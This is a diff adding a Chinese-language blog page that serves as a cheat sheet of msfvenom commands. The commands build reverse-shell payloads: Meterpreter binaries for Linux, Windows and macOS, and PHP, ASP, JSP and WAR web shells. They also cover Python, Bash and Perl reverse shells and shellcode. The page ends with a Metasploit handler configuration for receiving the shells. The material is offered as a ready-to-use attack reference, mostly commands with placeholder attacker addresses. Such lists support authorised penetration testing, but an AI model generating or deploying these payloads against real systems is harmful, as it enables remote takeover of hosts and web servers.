@@ -1,0 +1,192 @@
+
+<!DOCTYPE html>
+<html lang="en" class="loading">
+<head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>msfvenom常用命令 - hello</title>
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="google" content="notranslate" />
+    <meta name="keywords" content="Fechin,"> 
+    <meta name="description" content="msf -l列出命令
+Linux1msfvenom -p linux&amp;#x2F;x86&amp;#x2F;meterpreter&amp;#x2F;reverse_tcp LHOST&amp;#x3D;&amp;lt;Your I,"> 
+    <meta name="author" content="John Doe"> 
+    <link rel="alternative" href="atom.xml" title="hello" type="application/atom+xml"> 
+    <link rel="icon" href="/img/favicon.png"> 
+    
+    
+<link rel="stylesheet" href="/css/diaspora.css">
+
+	<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+    <script>
+         (adsbygoogle = window.adsbygoogle || []).push({
+              google_ad_client: "ca-pub-8691406134231910",
+              enable_page_level_ads: true
+         });
+    </script>
+    <script async custom-element="amp-auto-ads"
+        src="https://cdn.ampproject.org/v0/amp-auto-ads-0.1.js">
+    </script>
+<meta name="generator" content="Hexo 4.2.0"></head>
+<script src="https://cdn.jsdelivr.net/gh/wallleap/cdn@latest/js/hititle.js"></script>
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome/css/font-awesome.min.css">
+<script src="https://cdn.jsdelivr.net/npm/jquery/dist/jquery.min.js"></script>
+<script type="text/javascript" src="http://ip.t086.com/getip.php"></script>
+
+<body class="loading">
+    <span id="config-title" style="display:none">hello</span>
+    <div id="loader"></div>
+    <div id="single">
+    <div id="top" style="display: block;">
+    <div class="bar" style="width: 0;"></div>
+    <a class="iconfont icon-home image-icon" href="javascript:;" data-url="http://yoursite.com"></a>
+    <div title="播放/暂停" class="iconfont icon-play"></div>
+    <h3 class="subtitle">msfvenom常用命令</h3>
+    <div class="social">
+        <div>
+            <div class="share">
+                <a title="获取二维码" class="iconfont icon-scan" href="javascript:;"></a>
+            </div>
+            <div id="qr"></div>
+        </div>
+    </div>
+    <div class="scrollbar"></div>
+</div>
+
+    <div class="section">
+        <div class="article">
+    <div class='main'>
+        <h1 class="title">msfvenom常用命令</h1>
+        <div class="stuff">
+            <span>四月 04, 2020</span>
+            
+
+        </div>
+        <div class="content markdown">
+            <h5 id="msf-l"><a href="#msf-l" class="headerlink" title="msf -l"></a>msf -l</h5><p>列出命令</p>
+<h5 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux&#x2F;x86&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;&lt;Your IP Address&gt; LPORT&#x3D;&lt;Your Port to Connect On&gt; -f elf &gt; shell.elf</span><br></pre></td></tr></table></figure>
+<h5 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;&lt;Your IP Address&gt; LPORT&#x3D;&lt;Your Port to Connect On&gt; -f exe &gt; shell.exe</span><br></pre></td></tr></table></figure>
+<h5 id="Mac"><a href="#Mac" class="headerlink" title="Mac"></a>Mac</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p osx&#x2F;x86&#x2F;shell_reverse_tcp LHOST&#x3D;&lt;Your IP Address&gt; LPORT&#x3D;&lt;Your Port to Connect On&gt; -f macho &gt; shell.macho</span><br></pre></td></tr></table></figure>
+<h4 id="Web-Payloads"><a href="#Web-Payloads" class="headerlink" title="Web Payloads"></a>Web Payloads</h4><h5 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p php&#x2F;meterpreter_reverse_tcp LHOST&#x3D;&lt;Your IP Address&gt; LPORT&#x3D;&lt;Your Port to Connect On&gt; -f raw &gt; shell.php</span><br><span class="line">cat shell.php | pbcopy &amp;&amp; echo &#39;&lt;?php &#39; | tr -d &#39;\n&#39; &gt; shell.php &amp;&amp; pbpaste &gt;&gt; shell.php</span><br></pre></td></tr></table></figure>
+<h5 id="ASP"><a href="#ASP" class="headerlink" title="ASP"></a>ASP</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;&lt;Your IP Address&gt; LPORT&#x3D;&lt;Your Port to Connect On&gt; -f asp &gt; shell.asp</span><br></pre></td></tr></table></figure>
+<h5 id="JSP"><a href="#JSP" class="headerlink" title="JSP"></a>JSP</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p java&#x2F;jsp_shell_reverse_tcp LHOST&#x3D;&lt;Your IP Address&gt; LPORT&#x3D;&lt;Your Port to Connect On&gt; -f raw &gt; shell.jsp</span><br></pre></td></tr></table></figure>
+<h5 id="WAR"><a href="#WAR" class="headerlink" title="WAR"></a>WAR</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p java&#x2F;jsp_shell_reverse_tcp LHOST&#x3D;&lt;Your IP Address&gt; LPORT&#x3D;&lt;Your Port to Connect On&gt; -f war &gt; shell.war</span><br></pre></td></tr></table></figure>
+<h4 id="Scripting-Payloads"><a href="#Scripting-Payloads" class="headerlink" title="Scripting Payloads"></a>Scripting Payloads</h4><h5 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h5><h5 id="msfvenom-p-cmd-unix-reverse-python-LHOST-LPORT-f-raw-gt-shell-py"><a href="#msfvenom-p-cmd-unix-reverse-python-LHOST-LPORT-f-raw-gt-shell-py" class="headerlink" title="msfvenom -p cmd/unix/reverse_python LHOST= LPORT= -f raw &gt; shell.py"></a>msfvenom -p cmd/unix/reverse_python LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw &gt; shell.py</h5><h4 id="Bash"><a href="#Bash" class="headerlink" title="Bash"></a>Bash</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p cmd&#x2F;unix&#x2F;reverse_bash LHOST&#x3D;&lt;Your IP Address&gt; LPORT&#x3D;&lt;Your Port to Connect On&gt; -f raw &gt; shell.sh</span><br></pre></td></tr></table></figure>
+<h5 id="Perl"><a href="#Perl" class="headerlink" title="Perl"></a>Perl</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p cmd&#x2F;unix&#x2F;reverse_perl LHOST&#x3D;&lt;Your IP Address&gt; LPORT&#x3D;&lt;Your Port to Connect On&gt; -f raw &gt; shell.pl</span><br></pre></td></tr></table></figure>
+<h4 id="Shellcode"><a href="#Shellcode" class="headerlink" title="Shellcode"></a>Shellcode</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">For all shellcode see ‘msfvenom –help-formats’ for information as to valid parameters. Msfvenom will output code that is able to be cut and pasted in this language for your exploits.</span><br></pre></td></tr></table></figure>
+<h5 id="Linux-Based-Shellcode"><a href="#Linux-Based-Shellcode" class="headerlink" title="Linux Based Shellcode"></a>Linux Based Shellcode</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux&#x2F;x86&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;&lt;Your IP Address&gt; LPORT&#x3D;&lt;Your Port to Connect On&gt; -f &lt;language&gt;</span><br></pre></td></tr></table></figure>
+<h5 id="Windows-Based-Shellcode"><a href="#Windows-Based-Shellcode" class="headerlink" title="Windows Based Shellcode"></a>Windows Based Shellcode</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;&lt;Your IP Address&gt; LPORT&#x3D;&lt;Your Port to Connect On&gt; -f &lt;language&gt;</span><br></pre></td></tr></table></figure>
+<h5 id="Mac-Based-Shellcode"><a href="#Mac-Based-Shellcode" class="headerlink" title="Mac Based Shellcode"></a>Mac Based Shellcode</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p osx&#x2F;x86&#x2F;shell_reverse_tcp LHOST&#x3D;&lt;Your IP Address&gt; LPORT&#x3D;&lt;Your Port to Connect On&gt; -f &lt;language&gt;</span><br></pre></td></tr></table></figure>
+<h5 id="Handlers"><a href="#Handlers" class="headerlink" title="Handlers"></a>Handlers</h5><p>Metasploit handlers can be great at quickly setting up Metasploit to be in a position to receive your incoming shells. Handlers should be in the following format.</p>
+<p>use exploit/multi/handler<br>set PAYLOAD <Payload name><br>set LHOST <LHOST value><br>set LPORT <LPORT value><br>set ExitOnSession false<br>exploit -j -z</p>
+
+            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
+            <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="true">
+                <source type="audio/mpeg" src="">
+            </audio>
+            
+                <ul id="audio-list" style="display:none">
+                    
+                </ul>
+            
+        </div>
+        
+    <div id='gitalk-container' class="comment link"
+		data-enable='false'
+        data-ae='false'
+        data-ci=''
+        data-cs=''
+        data-r=''
+        data-o=''
+        data-a=''
+        data-d='false'
+    >查看评论</div>
+
+
+    </div>
+    
+        <div class='side'>
+			<ol class="toc"><li class="toc-item toc-level-5"><a class="toc-link" href="#msf-l"><span class="toc-number">1.</span> <span class="toc-text">msf -l</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Linux"><span class="toc-number">2.</span> <span class="toc-text">Linux</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Windows"><span class="toc-number">3.</span> <span class="toc-text">Windows</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Mac"><span class="toc-number">4.</span> <span class="toc-text">Mac</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Web-Payloads"><span class="toc-number"></span> <span class="toc-text">Web Payloads</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#PHP"><span class="toc-number">1.</span> <span class="toc-text">PHP</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#ASP"><span class="toc-number">2.</span> <span class="toc-text">ASP</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#JSP"><span class="toc-number">3.</span> <span class="toc-text">JSP</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#WAR"><span class="toc-number">4.</span> <span class="toc-text">WAR</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Scripting-Payloads"><span class="toc-number"></span> <span class="toc-text">Scripting Payloads</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#Python"><span class="toc-number">1.</span> <span class="toc-text">Python</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#msfvenom-p-cmd-unix-reverse-python-LHOST-LPORT-f-raw-gt-shell-py"><span class="toc-number">2.</span> <span class="toc-text">msfvenom -p cmd&#x2F;unix&#x2F;reverse_python LHOST&#x3D; LPORT&#x3D; -f raw &gt; shell.py</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Bash"><span class="toc-number"></span> <span class="toc-text">Bash</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#Perl"><span class="toc-number">1.</span> <span class="toc-text">Perl</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Shellcode"><span class="toc-number"></span> <span class="toc-text">Shellcode</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#Linux-Based-Shellcode"><span class="toc-number">1.</span> <span class="toc-text">Linux Based Shellcode</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Windows-Based-Shellcode"><span class="toc-number">2.</span> <span class="toc-text">Windows Based Shellcode</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Mac-Based-Shellcode"><span class="toc-number">3.</span> <span class="toc-text">Mac Based Shellcode</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Handlers"><span class="toc-number">4.</span> <span class="toc-text">Handlers</span></a></li></ol>	
+        </div>
+    
+</div>
+
+
+    </div>
+</div>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginModelPath":"assets/","model":{"jsonPath":"/live2dw/assets/z16.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+
+
+<script src="//lib.baomitu.com/jquery/1.8.3/jquery.min.js"></script>
+<script src="/js/plugin.js"></script>
+<script src="/js/typed.js"></script>
+<script src="/js/diaspora.js"></script>
+
+
+<link rel="stylesheet" href="/photoswipe/photoswipe.css">
+<link rel="stylesheet" href="/photoswipe/default-skin/default-skin.css">
+
+
+<script src="/photoswipe/photoswipe.min.js"></script>
+<script src="/photoswipe/photoswipe-ui-default.min.js"></script>
+
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+            <div class="pswp__top-bar">
+                <!--  Controls are self-explanatory. Order can be changed. -->
+                <div class="pswp__counter"></div>
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                      <div class="pswp__preloader__cut">
+                        <div class="pswp__preloader__donut"></div>
+                      </div>
+                    </div>
+                </div>
+            </div>
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div> 
+            </div>
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+
+
+</html>
+<script src="https://cdn.jsdelivr.net/gh/wallleap/cdn/js/sakura.js"></script>
+<script src="//instant.page/3.0.0" type="module" defer integrity="sha384-OeDn4XE77tdHo8pGtE1apMPmAipjoxUQ++eeJa6EtJCfHlvijigWiJpD7VDPWXV1"></script>
+<script src="https://cdn.jsdelivr.net/gh/yunjuan-yunshu/live2d-widget@0.7.3/autoload.js"></script>
